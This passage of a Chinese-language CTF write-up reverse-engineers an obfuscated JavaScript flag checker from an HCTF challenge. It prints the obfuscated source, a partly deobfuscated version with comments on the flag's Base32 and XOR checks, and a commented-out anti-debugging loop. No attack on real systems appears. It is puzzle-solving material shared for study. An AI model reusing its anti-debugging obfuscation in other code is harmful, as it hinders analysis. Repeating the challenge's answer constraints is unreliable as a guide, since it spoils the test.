class="number">0x0</span>));</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (_0x30f185) &#123;</span><br><span class="line">                        <span class="built_in">setTimeout</span>(_0x3c3bd8, <span class="number">0x1388</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;());</span><br><span class="line">            &#125;());</span><br><span class="line">            <span class="keyword">return</span> _0x4dc510[_0xa180(<span class="string">&#x27;0x31&#x27;</span>)](<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        e = _0x1c3854(b2c(_0x76e1e8[<span class="number">0x2</span>])[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>]) ^ <span class="number">0x53a3f32</span>;</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="number">0x4b7c0a73</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        f = _0x1c3854(b2c(_0x76e1e8[<span class="number">0x3</span>])[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>]) ^ e;</span><br><span class="line">        <span class="keyword">if</span> (f != <span class="number">0x4315332</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        n = f * e * _0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)];</span><br><span class="line">        h = <span class="function"><span class="keyword">function</span> (<span class="params">_0x4c466e, _0x28871</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3ea581 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _0x2fbf7a = <span class="number">0x0</span>; _0x2fbf7a &lt; _0x4c466e[_0x43c8d1(<span class="number">0x8</span>)]; _0x2fbf7a++) &#123;</span><br><span class="line">                _0x3ea581 += _0x28871(_0x4c466e[_0x2fbf7a]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> _0x3ea581;</span><br><span class="line">        &#125;;</span><br><span class="line">        j = _0x76e1e8[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (j[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)] != j[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0x8</span>)] || (_0x1c3854(j[<span class="number">0x0</span>]) ^ _0x1c3854(j[<span class="number">0x1</span>])) != <span class="number">0x1613</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        k = <span class="function"><span class="params">_0xffcc52</span> =&gt;</span> _0xffcc52[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)]() * _0x76e1e8[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0x8</span>)];</span><br><span class="line">        l = h(j[<span class="number">0x0</span>], k);</span><br><span class="line">        <span class="keyword">if</span> (l != <span class="number">0x2f9b5072</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        m = _0x1c3854(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x0</span>, <span class="number">0x4</span>)) - <span class="number">0x48a05362</span> == n % l;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">_0x5a6d56</span>(<span class="params">_0x5a25ab, _0x4a4483</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x55b09f = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _0x508ace = <span class="number">0x0</span>; _0x508ace &lt; _0x4a4483; _0x508ace++) &#123;</span><br><span class="line">                _0x55b09f += _0x5a25ab;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> _0x55b09f;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!m || _0x5a6d56(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x5</span>, <span class="number">0x1</span>), <span class="number">0x2</span>) == _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x5</span>, <span class="number">0x4</span>) || _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x2</span>, <span class="number">0x1</span>) - _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) != <span class="number">0x1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        o = _0x1c3854(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x2</span>))[_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x2</span>) == _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x1</span>)[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)]() * _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0x8</span>)] * <span class="number">0x5</span>;</span><br><span class="line">        <span class="keyword">return</span> o &amp;&amp; _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) == <span class="number">0x2</span> &amp;&amp; _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x2</span>) == _0x5a6d56(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x7</span>, <span class="number">0x1</span>), <span class="number">0x2</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x4cbb89) &#123;</span><br><span class="line">        <span class="built_in">console</span>[<span class="string">&#x27;log&#x27;</span>](<span class="string">&#x27;gg&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5bf136 = <span class="built_in">document</span>[_0xa180(<span class="string">&#x27;0x32&#x27;</span>)](_0xa180(<span class="string">&#x27;0x33&#x27;</span>))[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (_0x5bf136 == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>[_0xa180(<span class="string">&#x27;0x34&#x27;</span>)](_0xa180(<span class="string">&#x27;0x35&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> _0x4d0e29 = check(_0x5bf136);</span><br><span class="line">    <span class="keyword">if</span> (_0x4d0e29) &#123;</span><br><span class="line">        alert(_0xa180(<span class="string">&#x27;0x36&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(_0xa180(<span class="string">&#x27;0x37&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>[<span class="string">&#x27;onload&#x27;</span>] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(_0xa180(<span class="string">&#x27;0x38&#x27;</span>), <span class="number">0x32</span>);</span><br><span class="line">    test();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>进一步反混淆</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x180a = [<span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;charCodeAt&#x27;</span>, <span class="string">&#x27;fromCharCode&#x27;</span>, <span class="string">&#x27;parse&#x27;</span>, <span class="string">&#x27;substr&#x27;</span>, <span class="string">&#x27;\x5cw+&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;(3()&#123;(3\x20a()&#123;7&#123;(3\x20b(2)&#123;9((\x27\x27+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(\x274\x27)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125;&#125;)()&#125;)();&#x27;</span>, <span class="string">&#x27;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;length&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;getElementById&#x27;</span>, <span class="string">&#x27;message&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;Welcome\x20to\x20HCTF:&gt;&#x27;</span>, <span class="string">&#x27;Congratulations!\x20you\x20got\x20it!&#x27;</span>, <span class="string">&#x27;Sorry,\x20you\x20are\x20wrong...&#x27;</span>, <span class="string">&#x27;window.console.clear();window.console.log(\x27Welcome\x20to\x20HCTF\x20:&gt;\x27)&#x27;</span>, <span class="string">&#x27;version&#x27;</span>, <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;download&#x27;</span>, <span class="string">&#x27;substring&#x27;</span>, <span class="string">&#x27;push&#x27;</span>, <span class="string">&#x27;Function&#x27;</span>, <span class="string">&#x27;charAt&#x27;</span>, <span class="string">&#x27;idle&#x27;</span>, <span class="string">&#x27;pyW5F1U43VI&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;https://the-extension.com&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;storage&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;then&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;getTime&#x27;</span>, <span class="string">&#x27;setUTCHours&#x27;</span>, <span class="string">&#x27;origin&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;loading&#x27;</span>, <span class="string">&#x27;status&#x27;</span>, <span class="string">&#x27;removeListener&#x27;</span>, <span class="string">&#x27;onUpdated&#x27;</span>, <span class="string">&#x27;callee&#x27;</span>, <span class="string">&#x27;addListener&#x27;</span>, <span class="string">&#x27;onMessage&#x27;</span>, <span class="string">&#x27;runtime&#x27;</span>, <span class="string">&#x27;executeScript&#x27;</span>, <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;Url\x20error&#x27;</span>, <span class="string">&#x27;query&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;active&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 洗牌</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0xd4b7d6, _0xad25ab</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5e3956 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x1661d3</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (--_0x1661d3) &#123;</span><br><span class="line">            _0xd4b7d6[<span class="string">&#x27;push&#x27;</span>](_0xd4b7d6[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    _0x5e3956(++_0xad25ab);</span><br><span class="line">&#125;(_0x180a, <span class="number">0x1a2</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取数组内容</span></span><br><span class="line"><span class="keyword">var</span> _0xa180 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x5c351c, _0x2046d8</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> _0x180a[_0x5c351c - <span class="number">0x0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主要的check函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> _0x2e2f8d = [<span class="string">&#x27;code&#x27;</span>, _0xa180(<span class="string">&#x27;0x0&#x27;</span>), _0xa180(<span class="string">&#x27;0x1&#x27;</span>), _0xa180(<span class="string">&#x27;0x2&#x27;</span>), <span class="string">&#x27;invalidMonetizationCode&#x27;</span>, _0xa180(<span class="string">&#x27;0x3&#x27;</span>), _0xa180(<span class="string">&#x27;0x4&#x27;</span>), _0xa180(<span class="string">&#x27;0x5&#x27;</span>), _0xa180(<span class="string">&#x27;0x6&#x27;</span>), _0xa180(<span class="string">&#x27;0x7&#x27;</span>), _0xa180(<span class="string">&#x27;0x8&#x27;</span>), _0xa180(<span class="string">&#x27;0x9&#x27;</span>), _0xa180(<span class="string">&#x27;0xa&#x27;</span>), _0xa180(<span class="string">&#x27;0xb&#x27;</span>), _0xa180(<span class="string">&#x27;0xc&#x27;</span>), _0xa180(<span class="string">&#x27;0xd&#x27;</span>), _0xa180(<span class="string">&#x27;0xe&#x27;</span>), _0xa180(<span class="string">&#x27;0xf&#x27;</span>), _0xa180(<span class="string">&#x27;0x10&#x27;</span>), _0xa180(<span class="string">&#x27;0x11&#x27;</span>), <span class="string">&#x27;url&#x27;</span>, _0xa180(<span class="string">&#x27;0x12&#x27;</span>), _0xa180(<span class="string">&#x27;0x13&#x27;</span>), _0xa180(<span class="string">&#x27;0x14&#x27;</span>), _0xa180(<span class="string">&#x27;0x15&#x27;</span>), _0xa180(<span class="string">&#x27;0x16&#x27;</span>), _0xa180(<span class="string">&#x27;0x17&#x27;</span>), _0xa180(<span class="string">&#x27;0x18&#x27;</span>), <span class="string">&#x27;tabs&#x27;</span>, _0xa180(<span class="string">&#x27;0x19&#x27;</span>), _0xa180(<span class="string">&#x27;0x1a&#x27;</span>), _0xa180(<span class="string">&#x27;0x1b&#x27;</span>), _0xa180(<span class="string">&#x27;0x1c&#x27;</span>), _0xa180(<span class="string">&#x27;0x1d&#x27;</span>), <span class="string">&#x27;replace&#x27;</span>, _0xa180(<span class="string">&#x27;0x1e&#x27;</span>), _0xa180(<span class="string">&#x27;0x1f&#x27;</span>), <span class="string">&#x27;includes&#x27;</span>, _0xa180(<span class="string">&#x27;0x20&#x27;</span>), <span class="string">&#x27;length&#x27;</span>, _0xa180(<span class="string">&#x27;0x21&#x27;</span>), _0xa180(<span class="string">&#x27;0x22&#x27;</span>), _0xa180(<span class="string">&#x27;0x23&#x27;</span>), _0xa180(<span class="string">&#x27;0x24&#x27;</span>), _0xa180(<span class="string">&#x27;0x25&#x27;</span>), _0xa180(<span class="string">&#x27;0x26&#x27;</span>), _0xa180(<span class="string">&#x27;0x27&#x27;</span>), _0xa180(<span class="string">&#x27;0x28&#x27;</span>), _0xa180(<span class="string">&#x27;0x29&#x27;</span>), <span class="string">&#x27;toString&#x27;</span>, _0xa180(<span class="string">&#x27;0x2a&#x27;</span>), <span class="string">&#x27;split&#x27;</span>];</span><br><span class="line">        <span class="keyword">var</span> _0x50559f = input[_0x2e2f8d[<span class="number">0x5</span>]](<span class="number">0x0</span>, <span class="number">0x4</span>);  <span class="comment">// 获取输入的前四位，hctf&#123;</span></span><br><span class="line">        <span class="keyword">var</span> _0x5cea12 = <span class="built_in">parseInt</span>(btoa(_0x50559f), <span class="number">0x20</span>);  <span class="comment">// Base64编码，转成int</span></span><br><span class="line">        <span class="built_in">console</span>.log(_0x5cea12);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 启动Debugger，干扰console，但是对输入没有任何影响</span></span><br><span class="line"><span class="comment">        eval(function (_0x200db2, _0x177f13, _0x46da6f, _0x802d91, _0x2d59cf, _0x2829f2) &#123;</span></span><br><span class="line"><span class="comment">            _0x2d59cf = function (_0x4be75f) &#123;</span></span><br><span class="line"><span class="comment">                return _0x4be75f[&#x27;toString&#x27;](_0x177f13);</span></span><br><span class="line"><span class="comment">            &#125;;</span></span><br><span class="line"><span class="comment">            if (!&#x27;&#x27; [&#x27;replace&#x27;](/^/, String)) &#123;</span></span><br><span class="line"><span class="comment">                while (_0x46da6f--) _0x2829f2[_0x2d59cf(_0x46da6f)] = _0x802d91[_0x46da6f] || _0x2d59cf(_0x46da6f);</span></span><br><span class="line"><span class="comment">                _0x802d91 = [</span></span><br><span class="line"><span class="comment">                    function (_0x5e8f1a) &#123;</span></span><br><span class="line"><span class="comment">                        return _0x2829f2[_0x5e8f1a];</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                ];</span></span><br><span class="line"><span class="comment">                _0x2d59cf = function () &#123;</span></span><br><span class="line"><span class="comment">                    return _0xa180(&#x27;0x2b&#x27;);</span></span><br><span class="line"><span class="comment">                &#125;;</span></span><br><span class="line"><span class="comment">                _0x46da6f = 0x1;</span></span><br><span class="line"><span class="comment">            &#125;;</span></span><br><span class="line"><span class="comment">            while (_0x46da6f--)</span></span><br><span class="line"><span class="comment">                if (_0x802d91[_0x46da6f]) _0x200db2 = _0x200db2[_0xa180(&#x27;0x2c&#x27;)](new RegExp(&#x27;\x5cb&#x27; + _0x2d59cf(_0x46da6f) + &#x27;\x5cb&#x27;, &#x27;g&#x27;), _0x802d91[_0x46da6f]);</span></span><br><span class="line"><span class="comment">            return _0x200db2;</span></span><br><span class="line"><span class="comment">        &#125;(_0xa180(&#x27;0x2d&#x27;), 0x11, 0x11, _0xa180(&#x27;0x2e&#x27;)[&#x27;split&#x27;](&#x27;|&#x27;), 0x0, &#123;&#125;));</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重新洗牌，保证输入的前四位是hctf&#123;</span></span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params">_0x3291b7, _0xced890</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0xaed809 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3aba26</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (--_0x3aba26) &#123;</span><br><span class="line">                    _0x3291b7[_0xa180(<span class="string">&#x27;0x4&#x27;</span>)](_0x3291b7[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            _0xaed809(++_0xced890);</span><br><span class="line">        &#125;(_0x2e2f8d, _0x5cea12 % <span class="number">0x7b</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取数组内容</span></span><br><span class="line">        <span class="keyword">var</span> _0x43c8d1 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3120e0</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x2e2f8d[<span class="built_in">parseInt</span>(_0x3120e0, <span class="number">0x10</span>)];</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 字符串转十六进制</span></span><br><span class="line">        <span class="keyword">var</span> stringToHex = <span class="function"><span class="keyword">function</span> (<span class="params">_0x52ba71</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="string">&#x27;0x&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0x0</span>; i &lt; _0x52ba71[_0x43c8d1(<span class="number">0x8</span>)]; i++) &#123;</span><br><span class="line">                char = _0x52ba71[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](i)</span><br><span class="line">                result += char[_0x43c8d1(<span class="number">0xc</span>)](<span class="number">0x10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将输入按照“_”分割</span></span><br><span class="line">        <span class="keyword">var</span> inputs = input[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> a = inputs[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x2</span>, <span class="number">0x2</span>);  <span class="comment">// 第一段的最后两个字符</span></span><br><span class="line">        <span class="keyword">var</span> b = inputs[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>);  <span class="comment">// 第一段的第五个字符，也就是“&#123;”</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// (第一段的最后两个字符 ^ &#x27;&#123;&#x27;) % 第一段长度 == 5</span></span><br><span class="line">        <span class="keyword">var</span> challenge1 = (</span><br><span class="line">                stringToHex(a) ^ stringToHex(b)</span><br><span class="line">                <span class="comment">// 第一段的长度</span></span><br><span class="line">            ) % inputs[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)] == <span class="number">0x5</span>;  <span class="comment">// 第一段长度大于5</span></span><br><span class="line">        <span class="comment">// 第一个判断条件，确定第一段的字符为hctf&#123;</span></span><br><span class="line">        <span class="comment">// if (!challenge1) &#123;</span></span><br><span class="line">            <span class="comment">// return ![];</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Base32编码</span></span><br><span class="line">        b2c = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3f9bc5</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3c3bd8 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&#x27;</span>;</span><br><span class="line">            <span class="keyword">var</span> _0x4dc510 = [];</span><br><span class="line">            <span class="keyword">var</span> _0x4a199f = <span class="built_in">Math</span>[_0xa180(<span class="string">&#x27;0x25&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="number">0x8</span>)] / <span class="number">0x5</span>);</span><br><span class="line">            <span class="keyword">var</span> _0x4ee491 = _0x3f9bc5[_0x43c8d1(<span class="number">0x8</span>)] % <span class="number">0x5</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 != <span class="number">0x0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> _0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; <span class="number">0x5</span> - _0x4ee491; _0x1e1753++) &#123;</span><br><span class="line">                    _0x3f9bc5 += <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                _0x4a199f += <span class="number">0x1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x4a199f; _0x1e1753++) &#123;</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span>) &gt;&gt; <span class="number">0x3</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span>) &amp; <span class="number">0x7</span>) &lt;&lt; <span class="number">0x2</span> | _0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &gt;&gt; <span class="number">0x6</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span 